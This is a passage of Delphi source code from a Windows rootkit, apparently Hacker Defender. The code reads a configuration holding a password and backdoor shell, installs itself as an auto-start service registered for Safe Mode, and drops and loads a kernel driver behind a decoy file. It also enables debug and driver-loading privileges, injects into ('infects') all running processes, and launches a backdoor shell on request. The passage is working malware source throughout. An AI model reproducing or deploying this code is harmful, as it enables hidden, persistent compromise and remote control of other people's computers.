 for LI:=0 to SettingsCount-1 do
 begin
  ReadLn(FIni,LLine);
  LULine:=UpCase(CorrectIniLine(LLine));
  LLine:=Copy(LLine,Pos('=',LLine)+1,MaxInt);
  if Pos('PASSWORD',LULine)=1 then
  begin
   LLine:=Copy(Trim(LLine),1,16);
   FillChar(LAuthStr,SizeOf(LAuthStr),$20);
   CopyMemory(@LAuthStr,Pointer(LLine),Length(LLine));
   LAuthNum:=AuthStrToNum(@LAuthStr);
   PCardinal(@PasswordArray)^:=LAuthNum;
   PasswordArraySize:=SizeOf(PasswordArray);
  end else if Pos('BACKDOORSHELL',LULine)=1 then BackdoorShell:=LLine
  else if Pos('SERVICENAME',LULine)=1 then ServiceName:=LLine
  else if Pos('SERVICEDISPLAYNAME',LULine)=1 then ServiceDisplayName:=LLine
  else if Pos('SERVICEDESCRIPTION',LULine)=1 then ServiceDescription:=LLine
  else if Pos('DRIVERNAME',LULine)=1 then DriverName:=LLine
  else if Pos('DRIVERFILENAME',LULine)=1 then DriverFileName:=LLine
  else if Pos('FILEMAPPINGNAME',LULine)=1 then FileMappingName:=Copy(LLine,1,FileMappingNameMaxLen);
 end;
 CloseFile(FIni);
 if (LAuthNum=0) or (Length(BackdoorShell)=0) or (Length(ServiceName)=0) or (Length(DriverName)=0)
  or (Length(DriverFileName)=0) or (Length(FileMappingName)=0) then Exit;

 for LI:=1 to Length(FileMappingName) do
  if (FileMappingName[LI]='\') or (FileMappingName[LI]='/') then FileMappingName[LI]:='-';

 Result:=True;
end;

procedure FillIniMapping;
{
 0: HiddenArraySize+4
 4: HiddenArray
 HAS+0: RootArraySize+4
 HAS+4: RootArray
 HAS+RAS+0: ServicesArraySize+4
 HAS+RAS+4: ServicesArray
 +RAS+SAS+0: RegKeysArraySize+4
 +RAS+SAS+4: RegKeysArray
 +SAS+RKS+0: RegValuesArraySize+4
 +SAS+RKS+4: RegValuesArray
 +RKS+RVS+0: PasswordArraySize+4
 +RKS+RVS+4: PasswordArray
 +RVS+PAS+0: FreeSpaceArraySize+4
 +RVS+PAS+4: FreeSpaceArray
 +PAS+FAS+0: HiddenPortsArraySize+4
 +PAS+FAS+4: HiddenPortsArray
}
var
 LPB:PByte;
 LPDW:PCardinal;
begin
 LPB:=IniMappingAddr;
 LPDW:=Pointer(LPB);
 LPDW^:=HiddenArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@HiddenArray,HiddenArraySize);
 Inc(LPB,HiddenArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=RootArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@RootArray,RootArraySize);
 Inc(LPB,RootArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=ServicesArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@ServicesArray,ServicesArraySize);
 Inc(LPB,ServicesArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=RegKeysArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@RegKeysArray,RegKeysArraySize);
 Inc(LPB,RegKeysArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=RegValuesArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@RegValuesArray,RegValuesArraySize);
 Inc(LPB,RegValuesArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=PasswordArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@PasswordArray,PasswordArraySize);
 Inc(LPB,PasswordArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=FreeSpaceArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@FreeSpaceArray,FreeSpaceArraySize);
 Inc(LPB,FreeSpaceArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=HiddenPortsArraySize+4;
 Inc(LPB,4);
 CopyMemory(LPB,@HiddenPortsArray,HiddenPortsArraySize);
 Inc(LPB,HiddenPortsArraySize);

 LPDW:=Pointer(LPB);
 LPDW^:=$00000000;
end;

function GetWindowsVersion:TWindowsVersion;
var
 LVerInfo:TOSVersionInfo;
begin
 Result:=wvUnknown;
 LVerInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
 if not GetVersionEx(LVerInfo) then Exit;
 if LVerInfo.dwMajorVersion>=5 then
 begin
  if LVerInfo.dwMinorVersion>=1 then Result:=wvWindowsXP
  else Result:=wvWindows2000;
 end else
 begin
  if LVerInfo.dwMajorVersion>3 then
  begin
   if LVerInfo.dwPlatformId<>VER_PLATFORM_WIN32_NT then
   begin
    LVerInfo.dwBuildNumber:=LVerInfo.dwBuildNumber and $FFFF;
    if LVerInfo.dwMinorVersion<90 then
    begin
     if LVerInfo.dwMinorVersion>=10 then
     begin
      if LVerInfo.dwBuildNumber>=2222 then Result:=wvWindows98SE
      else Result:=wvWindows98;
     end else
     begin
      if LVerInfo.dwBuildNumber>=1000 then Result:=wvWindows95OSR2
      else Result:=wvWindows95;
     end;
    end else Result:=wvWindowsMe;
   end else Result:=wvWindowsNT40;
  end else Result:=wvWin32s;
 end;
end;

function ReplaceShortcuts(AStr:string):string;
var
 LI:Integer;
begin
 Result:=AStr;
 for LI:=0 to ShortcutCount-1 do Result:=StrReplace(Result,Shortcuts[LI].OrgStr,Shortcuts[LI].NewStr);
end;

procedure InitShortcuts;
var
 LBuffer:array[0..MAX_PATH] of Char;
begin
 Shortcuts[0].OrgStr:='%cmd%';
 ZeroMemory(@LBuffer,Length(LBuffer));
 GetEnvironmentVariable(Comspec,LBuffer,SizeOf(LBuffer));
 Shortcuts[0].NewStr:=LBuffer;

 Shortcuts[1].OrgStr:='%cmddir%';
 Shortcuts[1].NewStr:=ExtractFilePath(Shortcuts[0].NewStr);
 AddLastBackSlash(Shortcuts[1].NewStr);

 Shortcuts[2].OrgStr:='%sysdir%';
 ZeroMemory(@LBuffer,Length(LBuffer));
 GetSystemDirectory(@LBuffer,MAX_PATH);
 Shortcuts[2].NewStr:=LBuffer;
 AddLastBackSlash(Shortcuts[2].NewStr);

 Shortcuts[3].OrgStr:='%windir%';
 ZeroMemory(@LBuffer,Length(LBuffer));
 GetWindowsDirectory(@LBuffer,MAX_PATH);
 Shortcuts[3].NewStr:=LBuffer;
 AddLastBackSlash(Shortcuts[3].NewStr);

 Shortcuts[4].OrgStr:='%tmpdir%';
 ZeroMemory(@LBuffer,Length(LBuffer));
 GetTempPath(SizeOf(LBuffer),LBuffer);
 Shortcuts[4].NewStr:=LBuffer;
 AddLastBackSlash(Shortcuts[4].NewStr);
end;

procedure RunOnStartup(AArgs:Pointer); stdcall;
var
 FIni:TextFile;
 LPos:Integer;
 LLine,LExec,LArgs:string;
 LSI:TStartupInfo;
 LPI:TProcessInformation;
 LWinVer:TWindowsVersion;
 LFlags:Cardinal;
begin
 InitShortcuts;
// Log('ros statr');
 if FileExists(IniFile) then
 begin
//  Log('eos ini exists');
  AssignFile(FIni,IniFile);
  Reset(FIni);
  LLine:='';
  while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[STARTUP RUN]') do ReadLn(FIni,LLine);
  while not EoF(FIni) do
  begin
   ReadLn(FIni,LLine);
   LLine:=ReplaceShortcuts(Trim(LLine));
   if Length(LLine)=0 then Break;
//   Log('ros line: '+LLine);
   LPos:=Pos('?',LLine);
   LArgs:='';
   if LPos>0 then
   begin
    LExec:=Copy(LLine,1,LPos-1);
    LArgs:=Copy(LLine,LPos+1,MaxInt);
   end else LExec:=LLine;
//   Log('roslexec: '+LExec);
//   Log('roslargs: '+LArgs);
   ZeroMemory(@LSI,SizeOf(LSI));
   LSI.cb:=SizeOf(LSI);
   LSI.dwFlags:=STARTF_USESHOWWINDOW;
   LWinVer:=GetWindowsVersion;
   if (LWinVer=wvWindowsNT40) or (LWinVer=wvUnknown) then LFlags:=0
   else LFlags:=DETACHED_PROCESS or CREATE_NEW_PROCESS_GROUP;

   if CreateProcess(PChar(LExec),PChar('"'+LExec+'" '+LArgs),nil,nil,False,LFlags,nil,nil,LSI,LPI) then
   begin
//    Log('ros success');
    CloseHandle(LPI.hThread);
    CloseHandle(LPI.hProcess);
   end;
//   Log('ros af cp');
  end;
  CloseFile(FIni);
 end;
// Log('ros end');
 ExitThread(0);
end;

procedure ServiceHandler(AControl:Integer); stdcall;
begin
 {$IF Logging_Level=3}
 Log('ServiceHandler: AControl = '+IntToStr(AControl));
 {$IFEND}
 case AControl of
  SERVICE_CONTROL_SHUTDOWN,SERVICE_CONTROL_STOP:begin
   with ServiceStatus do
   begin
    dwWin32ExitCode:=NO_ERROR;
    dwCheckPoint:=0;
    dwWaitHint:=0;
    dwCurrentState:=SERVICE_STOPPED;
   end;
   SendMainLoopTermination(AControl=SERVICE_CONTROL_STOP);
   while MainLoopRunning do WaitPoint(100);
  end;
 end;
 SetServiceStatus(ServiceStatusHandle,ServiceStatus);
end;

procedure ServiceProc(AArgc:Integer;AArgs:Pointer); stdcall;
begin
{$IF (Logging_Level=2) or (Logging_Level=3)}
 Log('service proc');
{$IFEND}

 ServiceStatusHandle:=RegisterServiceCtrlHandler(PChar(ServiceName),@ServiceHandler);
 if (ServiceStatusHandle<>0) or not (IsService) then
 begin
  if IsService then
  begin
  {$IF (Logging_Level=2) or (Logging_Level=3)}
   Log('it is service');
  {$IFEND}
   ZeroMemory(@ServiceStatus,SizeOf(ServiceStatus));
   with ServiceStatus do
   begin
    dwServiceType:=SERVICE_WIN32;
    dwControlsAccepted:=SERVICE_ACCEPT_SHUTDOWN or SERVICE_ACCEPT_STOP;
    dwWin32ExitCode:=NO_ERROR;
    dwServiceSpecificExitCode:=0;
    dwCheckPoint:=0;
    dwWaitHint:=0;
    dwCurrentState:=SERVICE_RUNNING;
    SetServiceStatus(ServiceStatusHandle,ServiceStatus);
   end;
  end;
  Main;
  {$IF Logging_Level=3}
   Log('ServiceProc after Main');
  {$IFEND}
  if IsService and (ServiceStatus.dwCurrentState=SERVICE_RUNNING) then
  begin
   ServiceStatus.dwCurrentState:=SERVICE_STOPPED;
   SetServiceStatus(ServiceStatusHandle,ServiceStatus);
  end;
 end;
end;

function ServiceRegistred:Boolean;
var
 LSCMHandle,LServiceHandle:SC_HANDLE;
begin
 Result:=False;
 LSCMHandle:=OpenSCManager(nil,nil,SC_MANAGER_ALL_ACCESS);
 if LSCMHandle=0 then Exit;
 LServiceHandle:=OpenService(LSCMHandle,PChar(ServiceName),SERVICE_ALL_ACCESS);
 Result:=not (LServiceHandle=0);
 if Result then CloseServiceHandle(LServiceHandle);
 CloseServiceHandle(LSCMHandle);
end;

function GetDriverFileName(AFileName:string):string;
var
 LPath:string;
begin
 LPath:=ExtractFilePath(DriverFileName);
 if (Length(LPath)=0) or not (DirectoryExists(LPath)) then Result:=ExtractFilePath(ParamStr(0))+ExtractFileName(DriverFileName)
 else Result:=DriverFileName;
end;

procedure RegisterSafeBoot;
var
 LHSafe,LHMin,LHNet,LHNew:HKEY;
 LDis,LBSize:Cardinal;
 LBuf:array[0..7] of Char;
begin
 LBuf:='Service'+#$00;
 LBSize:=SizeOf(LBuf);
 RegOpenKeyEx(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Control\SafeBoot\',0,KEY_ALL_ACCESS,LHSafe);
 RegOpenKeyEx(LHSafe,'Minimal',0,KEY_ALL_ACCESS,LHMin);
 RegOpenKeyEx(LHSafe,'Network',0,KEY_ALL_ACCESS,LHNet);
 RegCreateKeyEx(LHMin,PChar(ServiceName),0,nil,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,nil,LHNew,@LDis);
 RegSetValueEx(LHNew,nil,0,REG_SZ,@LBuf,LBSize);
 RegCreateKeyEx(LHNet,PChar(ServiceName),0,nil,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,nil,LHNew,@LDis);
 RegSetValueEx(LHNew,nil,0,REG_SZ,@LBuf,LBSize);
 RegCloseKey(LHMin);
 RegCloseKey(LHNet);
 RegCloseKey(LHSafe);
end;

procedure UninstallService(AName:PChar);
var
 LSCMHandle,LHandle:SC_HANDLE;
 LSvcStatus:TServiceStatus;
 LSCLock:SC_LOCK;
begin
{$IF Logging_Level=3}
 Log('uninstall service '+AName);
{$IFEND}

 LSCMHandle:=OpenSCManager(nil,nil,SC_MANAGER_ALL_ACCESS);
 if LSCMHandle<>0 then
 begin
  LSCLock:=LockServiceDatabase(LSCMHandle);
  LHandle:=OpenService(LSCMHandle,AName,SERVICE_ALL_ACCESS);
  if LHandle<>0 then
  begin
   QueryServiceStatus(LHandle,LSvcStatus);
   if LSvcStatus.dwCurrentState=SERVICE_RUNNING then
    ControlService(LHandle,SERVICE_CONTROL_STOP,LSvcStatus);
   DeleteService(LHandle);
   CloseServiceHandle(LHandle);
  end;
  CloseServiceHandle(LSCMHandle);
  UnlockServiceDatabase(LSCLock);
 end;
end;

procedure UninstallServiceOrDriver(AName:PChar);
var
 LSCM,LHandle:SC_HANDLE;

begin
 LSCM:=OpenSCManager(nil,nil,SC_MANAGER_ALL_ACCESS);
 if LSCM=0 then Exit;
 LHandle:=OpenService(LSCM,AName,SERVICE_ALL_ACCESS);
 if LHandle<>0 then
 begin
  DeleteService(LHandle);
  CloseServiceHandle(LHandle);
 end;
 CloseServiceHandle(LSCM);
end;

procedure UnregisterSafeBoot(AName:PChar);
var
 LHSafe,LHMin,LHNet:HKEY;
begin
 RegOpenKeyEx(HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Control\SafeBoot\',0,KEY_ALL_ACCESS,LHSafe);
 RegOpenKeyEx(LHSafe,'Minimal',0,KEY_ALL_ACCESS,LHMin);
 RegOpenKeyEx(LHSafe,'Network',0,KEY_ALL_ACCESS,LHNet);
 RegDeleteKey(LHMin,AName);
 RegDeleteKey(LHNet,AName);
 RegCloseKey(LHMin);
 RegCloseKey(LHNet);
 RegCloseKey(LHSafe);
end;

function UninstallRootkit:Boolean;
var
 LPID:Cardinal;
 LProcHandle:THandle;
begin
 if StartupFlags<>sfNoService then UninstallServiceOrDriver(PChar(ServiceName));
{$IFNDEF NODRIVER}
 UninstallServiceOrDriver(PChar(DriverName));
{$ENDIF}
{$IFNDEF NOSAFEBOOT}
 UnregisterSafeBoot(PChar(ServiceName));
{$ENDIF}
{$IFNDEF NODRIVER}
 USysUtils.DeleteFile(GetDriverFileName(DriverFileName));
{$ENDIF}

 //now kill all open backdoors 
 LPID:=0;
 while LPID<>$FFFFFFFF do
 begin
  LPID:=Name2PID(BackdoorShell);
  if LPID<>$FFFFFFFF then
  begin
   LProcHandle:=OpenProcess(PROCESS_ALL_ACCESS,False,LPID);
   TerminateProcess(LProcHandle,0);
  end;
 end;
 Result:=ProcessDoctor(DOCTOR_CURE);
end;

function ChangeServiceConfig2(AService:SC_HANDLE;AInfoLevel:Cardinal;AInfo:Pointer):Boolean; stdcall;
type
 TChangeServiceConfig2A=function(AService:SC_HANDLE;AInfoLevel:Cardinal;AInfo:Pointer):Boolean; stdcall;
var
 LLibHandle:THandle;
 LPtr:Pointer;
 ChangeServiceConfig2A:TChangeServiceConfig2A;
begin
{$IF Logging_Level=3}
 Log('change service config 2');
{$IFEND}

 LLibHandle:=LoadLibrary('advapi32.dll');
 LPtr:=GetProcAddress(LLibHandle,'ChangeServiceConfig2A');
 if LPtr<>nil then
 begin
 {$IF Logging_Level=3}
  Log('change service config 2a exists');
 {$IFEND}

  ChangeServiceConfig2A:=LPtr;
  Result:=ChangeServiceConfig2A(AService,AInfoLevel,AInfo);
 end else Result:=False;
{$IF Logging_Level=3}
 Log('change service config result = '+IntToStr(Ord(Result)));
{$IFEND}
end;

function CheckRunningDriver:Boolean;
var
 LDrvHandle:THandle;
begin
 LDrvHandle:=CreateFile(DriverDeviceName,GENERIC_ALL,0,nil,OPEN_EXISTING,0,0);
 Result:=LDrvHandle<>INVALID_HANDLE_VALUE;
 if Result then
{$IF Logging_Level=3}
 begin
  Log('driver is running');
{$IFEND}
  CloseHandle(LDrvHandle);
{$IF Logging_Level=3}
 end
{$IF Logging_Level=3}
  else Log('driver is not running, error: '+IntToStr(GetLastError))
{$IFEND}
 ;
{$IFEND}
end;

function StartDriver:Boolean;
var
 LPRegName:PChar;
 LADriverName:TAnsiString;
 LUDriverName:TUnicodeString;
 {$IF Logging_Level=3}
 LRet:Cardinal;
 {$IFEND}
begin
 Result:=CheckRunningDriver;
 if not Result then
 begin
  LPRegName:=PChar('\Registry\Machine\System\CurrentControlSet\Services\'+DriverName);
  LADriverName.Length:=Length(LPRegName);
  LADriverName.MaximumLength:=LADriverName.Length;
  LADriverName.Buffer:=LPRegName;
  RtlAnsiStringToUnicodeString(@LUDriverName,@LADriverName,True);
 {$IF Logging_Level=3}LRet:={$IFEND}
  NtLoadDriver(@LUDriverName);

 {$IF Logging_Level=3}
  Log('NtLoadDriver: '+IntToHex(LRet,8));
 {$IFEND}
  RtlFreeUnicodeString(@LUDriverName);
 end;

 Result:=CheckRunningDriver;
end;

function InstallDriverAndStart:Boolean;
var
 LPName:PChar;
 LExec:string;
 LType,LStart,LResSize,LBytesWritten,LDisposition,LErrorControl:Cardinal;
 LRes,LGlobalRes,LFile:THandle;
 LResPtr,LFakePtr:Pointer;
 LPB:PByte;
 LHKEY:HKEY;
 LI:Integer;
begin
 Result:=CheckRunningDriver;
 if not Result then
 begin
  LPName:=PChar(DriverName);

  LRes:=FindResource(0,PChar(1),RT_RCDATA);
  LGlobalRes:=LoadResource(0,LRes);
  LResPtr:=LockResource(LGlobalRes);
  LResSize:=SizeofResource(0,LRes);
  LExec:=GetDriverFileName(DriverFileName);
  LFakePtr:=Pointer(LocalAlloc(LMEM_FIXED,LResSize));

 {$IF Logging_Level=3}
  Log('deleting old driver file '+LExec,True);
 {$IFEND}

  USysUtils.DeleteFile(LExec);

 {$IF Logging_Level=3}
  Log('driver file deleted');
 {$IFEND}
 //fake driver
  LPB:=LFakePtr;
  for LI:=0 to LResSize-1 do
  begin
   LPB^:=Random($FF);
   Inc(LPB);
  end;
  LFile:=CreateFile(PChar(LExec),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_READONLY,0);
  if (LFile=INVALID_HANDLE_VALUE) or (LFile=0) or (not WriteFile(LFile,LFakePtr^,LResSize,LBytesWritten,nil))
   or (not (LBytesWritten=LResSize)) then Exit;
  CloseHandle(LFile);
  USysUtils.DeleteFile(LExec);
  
  Sleep(250);
 //now real driver 
  LFile:=CreateFile(PChar(LExec),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_READONLY,0);
  if (LFile=INVALID_HANDLE_VALUE) or (LFile=0) or (not WriteFile(LFile,LResPtr^,LResSize,LBytesWritten,nil))
   or (not (LBytesWritten=LResSize)) then Exit;
  CloseHandle(LFile);

  LErrorControl:=SERVICE_ERROR_IGNORE;
  LExec:='\??\'+LExec;
  LStart:=SERVICE_DEMAND_START;
  LType:=SERVICE_KERNEL_DRIVER;

  RegCreateKeyEx(HKEY_LOCAL_MACHINE,PChar('SYSTEM\CurrentControlSet\Services\'+LPName),0,nil,
                 REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,nil,LHKEY,@LDisposition);
  RegSetValueEx(LHKEY,'ErrorControl',0,REG_DWORD,@LErrorControl,SizeOf(LErrorControl));
  RegSetValueEx(LHKEY,'ImagePath',0,REG_EXPAND_SZ,@LExec[1],Length(LExec));
  RegSetValueEx(LHKEY,'Start',0,REG_DWORD,@LStart,SizeOf(LStart));
  RegSetValueEx(LHKEY,'Type',0,REG_DWORD,@LType,SizeOf(LType));
  RegCloseKey(LHKEY);

  Result:=StartDriver;
  if not Result then USysUtils.DeleteFile(LExec);
 end;
end;
(*  *)
{/new 080}

function InstallServiceAndStart:Boolean;
var
 LExec:string;
 LPName,LPDisplayName,LPDescription,LPArgs:PChar;
 LSCMHandle,LHandle:SC_HANDLE;
 LType,LStart:Cardinal;

begin
 Result:=False;
 LPName:=PChar(ServiceName);
 LPDisplayName:=PChar(ServiceDisplayName);
 LPDescription:=PChar(ServiceDescription);
 LExec:=ParamStr(0);
 if (StartupFlags<>sfInstallOnly) and (ParamCount>0) then LExec:=LExec+' '+ParamStr(1);
 LType:=SERVICE_WIN32_OWN_PROCESS;
 LStart:=SERVICE_AUTO_START;
 {$IF Logging_Level=2}
 Log('uninstalling old service | driver');
 {$IFEND}
 UninstallService(LPName);

 {$IFNDEF TESTINGTIME}
 {$IFNDEF NOSAFEBOOT}
 RegisterSafeBoot;
 {$ENDIF}
 {$ENDIF}

 LSCMHandle:=OpenSCManager(nil,nil,SC_MANAGER_ALL_ACCESS);
 if LSCMHandle=0 then Exit;
 {$IF (Logging_Level=2) or (Logging_Level=3)}
 Log('creating service');
 {$IFEND}
 LHandle:=CreateService(LSCMHandle,LPName,LPDisplayName,SERVICE_ALL_ACCESS,LType,LStart,
                        SERVICE_ERROR_IGNORE,PChar(LExec),nil,nil,nil,nil,nil);
 LPArgs:=nil;
 if LHandle<>0 then
 begin
 {$IF (Logging_Level=2) or (Logging_Level=3)}
  Log('service handle is valid');
 {$IFEND}
  ChangeServiceConfig2(LHandle,1,@LPDescription);

  if StartupFlags<>sfInstallOnly then Result:=StartService(LHandle,0,LPArgs)
  else Result:=True;
 {$IF (Logging_Level=2) or (Logging_Level=3)}
  if Result then Log('service started with no error')
  else Log('start service failed with error '+IntToStr(GetLastError));
 {$IFEND}
  CloseServiceHandle(LHandle);
 end;
 {$IF Logging_Level=2}
 Log('closing scm handle');
 {$IFEND}
 CloseServiceHandle(LSCMHandle);
end;

procedure StartSystemService;
begin
{$IF Logging_Level=3}
 Log('start system service');
{$IFEND}

 if StartupFlags=sfNoService then
 begin
  Main;
  Exit;
 end;

 IsService:=False;
{$IFDEF TESTINGTIME}
 Main;
{$ELSE}
 if ServiceRegistred then
 begin
 {$IF (Logging_Level=2) or (Logging_Level=3)}
  Log('service is registred');
 {$IFEND}
  IsService:=True;
  DispatchTable[0].lpServiceName:=PChar(ServiceName);
  DispatchTable[0].lpServiceProc:=@ServiceProc;
  DispatchTable[1].lpServiceName:=nil;
  DispatchTable[1].lpServiceProc:=nil;
  if StartupFlags<>sfInstallOnly then IsService:=StartServiceCtrlDispatcher(DispatchTable[0])
  else IsService:=False;
  if not IsService then InstallServiceAndStart;
 end else InstallServiceAndStart;
{$ENDIF}
end;


function EnablePrivilege(APrivilegeName:PChar):Boolean;
var
 LTokenHandle:THandle;
 LNameValue:TLargeInteger;
 LPrivileges:TOKEN_PRIVILEGES;
 LRetLen:Cardinal;
begin
 Result:=False;
 if not OpenProcessToken(GetCurrentProcess,TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,LTokenHandle) then Exit;
 if not LookupPrivilegeValue(nil,APrivilegeName,LNameValue) then
 begin
  CloseHandle(LTokenHandle);
  Exit;
 end;
 LPrivileges.PrivilegeCount:=1;
 LPrivileges.Privileges[0].Luid:=LNameValue;
 LPrivileges.Privileges[0].Attributes:=SE_PRIVILEGE_ENABLED;
 Result:=AdjustTokenPrivileges(LTokenHandle,False,LPrivileges,SizeOf(LPrivileges),nil,LRetLen);
 CloseHandle(LTokenHandle);
end;

function EnableDebugPrivilege:Boolean;
begin
 Result:=EnablePrivilege('SeDebugPrivilege');
end;

function EnableLoadDriverPrivilege:Boolean;
begin
 Result:=EnablePrivilege('SeLoadDriverPrivilege');
end;

function AuthFromParamStr:Cardinal;
var
 LAuthStr:array[0..15] of Char;
 LLen:Integer;
 LParStr:string;
begin
 Result:=0;
 LParStr:=ParamStr(0);
 while Length(LParStr)>0 do
 begin
  FillMemory(@LAuthStr,SizeOf(LAuthStr),$20);
  LLen:=Length(LParStr);
  if LLen>16 then LLen:=16;
  if Length(LParStr)>0 then
  begin
   CopyMemory(@LAuthStr,@LParStr[1],LLen);
   Result:=Result xor AuthStrToNum(@LAuthStr);
   LParStr:=Copy(LParStr,16,MaxInt);
  end;
 end;
end;

procedure GetServerMailslotName;
begin
 ServerMailslotName:=ServerMailslotNamePart+IntToHex(AuthFromParamStr,8);
end;

procedure SendMainLoopTermination(AUninstall:Boolean);
var
 LBuffer:TIntercomBuffer;
 LBytesWritten:Cardinal;
begin
 LBuffer.ID:='999'+#00;
 LBuffer.Msg:=RK_DIE;
 LBuffer.Data1:=AuthFromParamStr;
 if AUninstall then LBuffer.Data2:=RK_UNINSTALL
 else LBuffer.Data2:=RK_DIE;

 {$IF Logging_Level=3}
 Log('LBuffer.Msg: '+IntToStr(LBuffer.Msg));
 Log('LBuffer.Data1: '+IntToStr(LBuffer.Data1));
 Log('LBuffer.Data2: '+IntToStr(LBuffer.Data2));
 {$IFEND}

 WriteFile(ServerMailslotFileHandle,LBuffer,INTERCOM_BUFFER_SIZE,LBytesWritten,nil);
end;

procedure Main;
var
 LAppExec,LCmdLine,LBackdoorMailslot:string;
 LPI:TProcessInformation;
 LSI:TStartupInfo;
 LBackdoorMailslotFileHandle:THandle;
 LSecAttr:TSecurityAttributes;
 LSecDesc:TSecurityDescriptor;
 LPAcl:PAcl;
{$IFNDEF NODRIVER}
 LTID:Cardinal;
{$ENDIF}
begin
 Done:=False;
{$IF (Logging_Level=2) or (Logging_Level=3)}
 Log('running MAIN');
{$IFEND}
 if not CreateServerMailslot(ServerMailslotName,LPAcl) then Exit;
// Log('mailslot ok');
 VirtualFree(LPAcl,0,MEM_RELEASE);

 EnableDebugPrivilege;
 EnableLoadDriverPrivilege;

{$IFNDEF NODRIVER}
 CloseHandle(CreateThread(nil,0,@StartDriver,nil,0,LTID));      //run driver if installed
{$ENDIF}

 if not CreateIniMapping then Exit;
 FillIniMapping;

 if Done then Exit;
{$IF Logging_Level=3}
 Log('mapping filled');
{$IFEND}


 CountBasicOffsetAndFillBasicConsts;
{$IF Logging_Level=3}
 Log('offset count');
{$IFEND}

 if Done then Exit;
 InfectedProcessCount:=0;
 if not ProcessDoctor(DOCTOR_INFECT) then Exit; //infect processes
 ProcessDoctor(DOCTOR_INFECT);          //for processes which were started after process table
                                        //was get and before their parent was hooked
                                        //just to be sure
{$IF Logging_Level=3}
 Log('all '+IntToStr(InfectedProcessCount)+' process infected');
{$IFEND}

 if Done then Exit;
{$IFNDEF NODRIVER}
 {$IF Logging_Level=3}
 Log('installing driver');
 {$IFEND}
// if not InstallDriverAndStart then Exit;

 {$IF (Logging_Level=2) or (Logging_Level=3)}
 if
 {$IFEND}

 InstallDriverAndStart

 {$IF (Logging_Level=2) or (Logging_Level=3)}
 then Log('driver installed')
 else Log('driver is not installed')
 {$IFEND}
 ;
{$ENDIF}

 {$IF Logging_Level=2}
 Log('Creating run-on-startup thread');
 {$IFEND}
 if Done then Exit;
 CreateThread(nil,0,@RunOnStartup,nil,0,TID);

 RealHookedCount:=0;
 SomeCreateProcess:=0;

{$IF Logging_Level=3}
 Log('main loop');
{$IFEND}

 MainLoopRunning:=True;
 while not Done do
 begin
  if GetMailslotInfo(ServerMailslotHandle,nil,MessageSize,nil,nil) then
   if ReadFile(ServerMailslotHandle,IntercomBuffer,INTERCOM_BUFFER_SIZE,BytesRead,nil) then
   begin
    MsgSender:=StrToIntDef(IntercomBuffer.ID,-1)-1;
    MailslotName:=ClientMailslotNamePart+IntToStrLen(MsgSender+1,3);
    if (MsgSender<=InfectedProcessCount) or (MsgSender=998) then
    case IntercomBuffer.Msg of
     RK_RUN_BACKDOOR_REQ:begin
     {$IFDEF LOGGING}
      {$IF Logging_Level=1}
      Log('RK_RUN_BACKDOOR_REQ');
      {$IFEND}
     {$ENDIF}

      LAppExec:=ParamStr(0);
      LBackdoorMailslot:='\\.\mailslot\hxdef-rkb'+PChar(@IntercomBuffer.Data1);
      LCmdLine:='"'+LAppExec+'" -:bd:- '+LBackdoorMailslot+' "'+BackdoorShell+'"';

     {$IFDEF LOGGING}
      {$IF Logging_Level=1}
      Log('LAppExec = '+LAppExec,True);
      Log('LBackdoorMailslot = '+LBackdoorMailslot,True);
      Log('LCmdLine = '+LCmdLine,True);
      {$IFEND}
     {$ENDIF}

      LBackdoorMailslotFileHandle:=CreateFile(PChar(LBackdoorMailslot),GENERIC_WRITE,FILE_SHARE_READ,
                                              nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
      if LBackdoorMailslotFileHandle<>INVALID_HANDLE_VALUE then
      begin
      {$IFDEF LOGGING}
      {$IF Logging_Level=1}
       Log('backdoor mailslot file handle is valid');
      {$IFEND}
      {$ENDIF}
       ZeroMemory(@LPI,SizeOf(LPI));
       ZeroMemory(@LSI,SizeOf(LSI));
       with LSI do
       begin
        cb:=SizeOf(TStartupInfo);
        dwFlags:=STARTF_USESHOWWINDOW;
       end;
       IntercomBuffer.Msg:=RK_RUN_BACKDOOR_RES;
       IntercomBuffer.Data1:=0;

       if CreateEveryoneSecAttr(LSecAttr,LSecDesc,LPAcl) then
       begin
       {$IFDEF LOGGING}
       {$IF Logging_Level=1}
        Log('creating process ...');
       {$IFEND}
       {$ENDIF}
        if CreateProcess(PChar(LAppExec),PChar(LCmdLine),@LSecAttr,nil,False,DETACHED_PROCESS or CREATE_NEW_PROCESS_GROUP or CREATE_SUSPENDED,nil,nil,LSI,LPI) then
        begin                                           //yyyyyy
        {$IFDEF LOGGING}
         {$IF Logging_Level=1}
         Log('process created ok');
         {$IFEND}
        {$ENDIF}
         IntercomBuffer.Data1:=LPI.dwProcessId;
         VirtualFree(LPAcl,0,MEM_RELEASE);
        end
         {$IFDEF LOGGING}
         {$IF Logging_Level=1}
         else Log('creating process failed: '+IntToStr(GetLastError),True);
         {$IFEND}
         {$ENDIF};
       end;
       WriteFile(LBackdoorMailslotFileHandle,IntercomBuffer,INTERCOM_BUFFER_SIZE,BytesWritten,nil);
       CloseHandle(LBackdoorMailslotFileHandle);
       if LPI.hThread<>0 then
       begin
